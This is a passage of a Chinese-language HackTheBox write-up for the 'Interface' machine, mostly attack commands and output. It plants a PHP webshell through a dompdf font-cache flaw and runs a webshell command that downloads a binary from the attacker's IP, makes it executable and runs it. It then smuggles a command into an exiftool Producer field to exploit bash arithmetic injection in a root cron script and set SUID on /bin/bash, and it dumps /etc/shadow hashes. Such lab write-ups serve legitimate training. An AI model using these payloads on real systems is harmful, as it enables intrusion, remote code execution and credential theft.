+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241228012943-ytnip08.png" alt="image">​</p>
+<h2 id="Fuzzing-vendor"><a href="#Fuzzing-vendor" class="headerlink" title="Fuzzing vendor"></a>Fuzzing vendor</h2><p>另一個子目錄是 <code>vendor</code>​，所以嘗試掃描下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u <span class="string">&quot;http://prd.m.rendering-api.interface.htb/vendor&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt -d <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226235521-v7gq9kb.png" alt="image">​</p>
+<p>得到<code>dompdf</code>​，在進一步掃描下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u <span class="string">&quot;http://prd.m.rendering-api.interface.htb/vendor/dompdf&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt -d <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226235711-bznfooe.png" alt="image">​</p>
+<p>還是得到<code>dompdf</code>​，搜索了一番，看到 <a target="_blank" rel="noopener" href="https://github.com/dompdf/dompdf">dompdf </a>是使用 php 的框架寫的：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241226235831-a38t2ya.png" alt="image">​</p>
+<p>所以嘗試掃描一下 php 的後綴名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u <span class="string">&quot;http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227000329-1ywogsg.png" alt="image">​</p>
+<p>從結果中可以看到 <code>lib</code>​, <code>tests</code>​, <code>src</code>​ 分別對應 github 上的目錄：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227000349-ofzzgrf.png" alt="image">​</p>
+<p>搜索了一下相關的 exploit ，看到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227003904-zha06dr.png" alt="image">​</p>
+<p>這個 <code>dompdf</code>​ 只是一個框架，用來把 html 生成 pdf 用的，儅 html 裏有一些元素是使用自定義字體的時候，就會嘗試下載字體到緩存目錄上，然後進行渲染。在有漏洞的版本中，下載字體不會考慮後綴名，比如當我的字體文件是 <code>mane.php</code>​而不是 <code>mane.ttf</code>​，保存到緩存目錄的後綴名就是 <code>.php</code>​，這樣就能得到shell。</p>
+<p>其中<a target="_blank" rel="noopener" href="https://github.com/positive-security/dompdf-rce/">dompdf-rce</a>這個項目整合了所需的文件，但 <code>dompdf</code>​ 只是一個框架，由於沒有 <code>index.php</code>​ ，所以還需要找到另一個組件來調用<code>dompdf</code>​。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -v -X POST <span class="string">&#x27;http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227000737-cfwzjed.png" alt="image">​</p>
+<h2 id="Exploit-with-html2pdf"><a href="#Exploit-with-html2pdf" class="headerlink" title="Exploit with html2pdf"></a>Exploit with html2pdf</h2><p>還記得一開始的<code>/api/html2pdf</code>​ 從名字上猜測他會調用 <code>dompdf</code>​ 這個框架，根據的<a target="_blank" rel="noopener" href="https://github.com/positive-security/dompdf-rce/">dompdf-rce</a> 説明：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241228014703-ix9wj4v.png" alt="image">​</p>
+<p>需要修改 <code>exploit.css</code>​ 和 <code>exploit_font.php</code>​，其中 <code>exploit_font.php</code>​ 就放著一個字體，最後幾行插入php木馬，然後惡意的樣式文件就加載那個惡意字體，這樣就會把這個字體下載到臨時的目錄裏面：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241228014511-wkho546.png" alt="image">​</p>
+<p>改好後開啓python 的服務器 <code>python3 -m http.server 80</code>​ ，使用 html2pdf 新建一個pdf 帶有而已的樣式 試試看：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -v -X POST <span class="string">&#x27;http://prd.m.rendering-api.interface.htb/api/html2pdf&#x27;</span> -d <span class="string">&#x27;&#123;&quot;html&quot;:&quot;&lt;link rel=stylesheet href=&#x27;</span><span class="string">&#x27;http://10.10.16.31/exploit.css&#x27;</span><span class="string">&#x27;&gt;&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227004306-vbi1gvv.png" alt="image">​</p>
+<p>結果可以看到他正常的訪問了 <code>exploit_font.php</code>​ 文件，這意味著成功的下載了木馬在臨時的目錄裏面，那麽問題又來了，臨時的目錄文件是什麽？</p>
+<h2 id="Getting-upload-folder-path"><a href="#Getting-upload-folder-path" class="headerlink" title="Getting upload folder path"></a>Getting upload folder path</h2><p>根據文檔中的介紹沒有說下面的那一串 md5 來自哪裏，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227004823-h5mnuvj.png" alt="image">​</p>
+<p>繼續谷歌查找后，看到這篇文章：<a target="_blank" rel="noopener" href="https://positive.security/blog/dompdf-rce">https://positive.security/blog/dompdf-rce</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227005142-jdgxk35.png" alt="image">​</p>
+<p>大致意思是他的hash來自下載的url，在代碼的 9-19 行：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227005243-cynw3v4.png" alt="image">​</p>
+<p>可以看到 md5 是遠程下載的路徑的md5值，會放到框架目錄下的 <code>dompdf/lib/fonts/&lt;font-family&gt;_&lt;font-style&gt;_&lt;md5&gt;.php</code>​。</p>
+<p>由於在 <code>exploit.css</code>​ 裏面定義了下載路徑是 <code>http://10.10.16.31/exploit_font.php</code>​，通過計算 md5 得到：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo -n <span class="string">&#x27;http://10.10.16.31/exploit_font.php&#x27;</span> | md5sum </span><br><span class="line">69f1a1c61bd57f1bc6762fc8462e0121  -</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227011649-00woaes.png" alt="image">​</p>
+<p>所以下載路徑是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -v <span class="string">&#x27;http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_69f1a1c61bd57f1bc6762fc8462e0121.php?mane=id&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227011922-71zp2lm.png" alt="image">​</p>
+<p>可以看到 HTTP 的狀態碼是 200，所以嘗試上傳一個shell：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="number">10.10</span>.<span class="number">16.31</span>:<span class="number">1111</span>/mane <span class="literal">-o</span> /tmp/mane ; chmod <span class="number">777</span> /tmp/mane ; /tmp/mane </span><br></pre></td></tr></table></figure>
+
+<p>url加密後，傳到木馬上：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -v <span class="string">&#x27;http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_69f1a1c61bd57f1bc6762fc8462e0121.php?mane=curl%2010.10.16.31:1111/mane%20-o%20/tmp/mane%20;%20chmod%20777%20/tmp/mane%20;%20/tmp/mane%20&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227011935-re4zavm.png" alt="image">​</p>
+<p>然後就得到了 shell。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227012035-t3bh844.png" alt="image">​</p>
+<h1 id="Shell-as-webshell-to-root"><a href="#Shell-as-webshell-to-root" class="headerlink" title="Shell as webshell to root"></a>Shell as webshell to root</h1><p>從進程中看到：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ps -auxwwf</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227013052-94i1xbq.png" alt="image">​</p>
+<p>有一個 cronjob 的東西，使用 pspy 去監控一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pspy64</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227013238-on14dhf.png" alt="image">​</p>
+<p>背後有一個脚本在跑，所以嘗試看看脚本寫了什麽：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /usr/local/sbin/cleancache.sh</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227014409-ow21zbc.png" alt="image">​</p>
+<p>一眼就看到這裏有個漏洞，具體可以參考<a target="_blank" rel="noopener" href="https://dev.to/greymd/eq-can-be-critically-vulnerable-338m">這篇文章</a>，大概就是儅 <code>num=&#39;x[$(whoami)]&#39;</code>​ 的時候，運行到 <code>[[ &quot;$NUM&quot; -eq 100 ]]</code>​ 就會執行任意代碼，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227014933-6o5wb0l.png" alt="image">​</p>
+<p>根據上面 <code>cleancache.sh</code>​文件的内容，需要讓 <code>$meta_producer</code>​ 設置成 <code>x[$(whoami)]</code>​，但是<code>$meta_producer</code>​裏的内容是使用  <code>exiftool</code>​ 讀取文件的 <code>Producer</code>​ 屬性中獲得的。</p>
+<p>所以可以新建一個文件，使用 <code>exiftool</code>​ 去寫入一個文件的<code>Producer</code>​ 屬性，執行脚本的時候讀取回去，就得到任意的命令行執行，大概操作如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@interface:~$ touch  mane</span><br><span class="line">www-data@interface:~$ /usr/<span class="built_in">bin</span>/exiftool -Producer=<span class="string">&quot;somedata&quot;</span> mane</span><br><span class="line">www-data@interface:~$ meta_producer=$(/usr/<span class="built_in">bin</span>/exiftool -s -s -s -Producer <span class="string">&quot;mane&quot;</span> <span class="number">2</span>&gt;/dev/null | cut -d <span class="string">&quot; &quot;</span> -f1)  </span><br><span class="line">www-data@interface:~$ echo $meta_producer</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227014842-klzblxq.png" alt="image">​</p>
+<p>另外還需要注意 <code>cut -d &quot; &quot; -f1</code>​ ，這意思是使用  <code>exiftool</code>​ 讀取文件的 <code>Producer</code>​ 屬性，只要空格前的内容，也就是說空格后的内容就完全無視掉了，假設我想要 <code>chmod 4777 /bin/bash</code>​，所以需要寫入 <code>x[$(chmod 4777 /bin/bash)]</code>​：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cd /tmp</span><br><span class="line">$ rm mane</span><br><span class="line">$ touch  mane</span><br><span class="line">$ /usr/<span class="built_in">bin</span>/exiftool -Producer=<span class="string">&#x27;x[$(chmod 4777 /bin/bash)]&#x27;</span> mane</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015117-et2qicu.png" alt="image">​</p>
+<p>然後嘗試讀取：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/<span class="built_in">bin</span>/exiftool -s -s -s -Producer <span class="string">&quot;mane&quot;</span> <span class="number">2</span>&gt;/dev/null | cut -d <span class="string">&quot; &quot;</span> -f1</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015350-kfrh8cn.png" alt="image">​</p>
+<p>你可以看到他只有 <code>x[$(chmod</code>​，好在是使用bash運行的，在bash中 <code>$&#123;IFS&#125;</code>​ 就等於空格，所以可以把所有空格換成 <code>$&#123;IFS&#125;</code>​ ：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/<span class="built_in">bin</span>/exiftool -Producer=<span class="string">&#x27;x[$(chmod$&#123;IFS&#125;4777$&#123;IFS&#125;/bin/bash)]&#x27;</span> mane</span><br><span class="line">$ /usr/<span class="built_in">bin</span>/exiftool -s -s -s -Producer <span class="string">&quot;mane&quot;</span> <span class="number">2</span>&gt;/dev/null | cut -d <span class="string">&quot; &quot;</span> -f1</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015530-3llw30t.png" alt="image">​</p>
+<p>最終</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="variable">$</span> <span class="built_in">rm</span> mane</span><br><span class="line"><span class="variable">$</span> touch mane</span><br><span class="line"><span class="variable">$</span> /usr/bin/exiftool <span class="literal">-Producer</span>=<span class="string">&#x27;x[$(chmod$&#123;IFS&#125;4777$&#123;IFS&#125;/bin/bash)]&#x27;</span> mane</span><br></pre></td></tr></table></figure>
+
+<p>把文件寫入到<code>/tmp</code>​等待定時任務運行：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015622-vni0qp3.png" alt="image">​</p>
+<p>等運行了就可以得到 root 權限：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -p</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-r4q27qs10CnyK8hX-Interface/image-20241227015637-leebsoa.png" alt="image">​</p>
+<p>‍</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bash-<span class="number">4.4</span><span class="comment"># cat /etc/shadow </span></span><br><span class="line">root:$<span class="number">6</span>$vNqg/kOl$yP48ihB9Tz5fyR0bjFvDk/ZMwmOpr/a6Bx7Z3fpsTNQM.k2ip0weEHpNr2C0OY2qEIspg4KuTtB3R32.bPieX0:<span class="number">19316</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">daemon:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line"><span class="built_in">bin</span>:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sys:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sync:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">games:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">man:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">lp:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">mail:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">news:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">uucp:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">proxy:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">www-data:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">backup:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line"><span class="built_in">list</span>:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">irc:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">gnats:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">nobody:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-network:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-resolve:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">syslog:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">messagebus:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">_apt:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">lxd:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">uuidd:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">dnsmasq:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">landscape:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">pollinate:*:<span class="number">18480</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sshd:*:<span class="number">19316</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">dev:$<span class="number">6</span>$2RlsJ6Cm$3qBSlRXSbX0tjTK7orUlt3Wub/ahd1f5kAVDhnvd8zm2vFuPotd7o04vH04OgPjdvsfUp2sOpqQJz5Cge2h4C0:<span class="number">19367</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">_laurel:!:<span class="number">19370</span>::::::</span><br></pre></td></tr></table></figure>
+
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+<p><strong>感謝</strong>: 製作不易，如果我的writeup真的幫到你了, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">給我一個respect</a>，這樣我就會知道，感謝你！</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Found Mistakes</strong>: If you find something wrong in the page, please feel free email to <a href="mailto:&#x6d;&#97;&#110;&#x65;&#64;&#x6d;&#97;&#x6e;&#101;&#x73;&#x65;&#x63;&#46;&#99;&#x6f;&#109;">&#x6d;&#97;&#110;&#x65;&#64;&#x6d;&#97;&#x6e;&#101;&#x73;&#x65;&#x63;&#46;&#99;&#x6f;&#109;</a> thanksss !!!</p>
+<p><strong>發現一些錯誤</strong>: 如果你在文章中發現一些錯誤，請發郵件到 <a href="mailto:&#x6d;&#97;&#x6e;&#x65;&#64;&#x6d;&#x61;&#x6e;&#x65;&#115;&#x65;&#99;&#x2e;&#99;&#x6f;&#109;">&#x6d;&#97;&#x6e;&#x65;&#64;&#x6d;&#x61;&#x6e;&#x65;&#115;&#x65;&#99;&#x2e;&#99;&#x6f;&#109;</a> ，麻煩了！！</p>
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 完成 <code>INTRODUCTION TO ACADEMY</code> 這個模塊后可以解鎖更多的功能！</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&text=HackTheBox - Machine - Interface"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&title=HackTheBox - Machine - Interface"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&is_video=false&description=HackTheBox - Machine - Interface"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Interface&body=Check out this article: https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&title=HackTheBox - Machine - Interface"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&title=HackTheBox - Machine - Interface"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&title=HackTheBox - Machine - Interface"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&title=HackTheBox - Machine - Interface"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&name=HackTheBox - Machine - Interface&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/12/28/2024-htb-machine/56-Interface/&t=HackTheBox - Machine - Interface"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
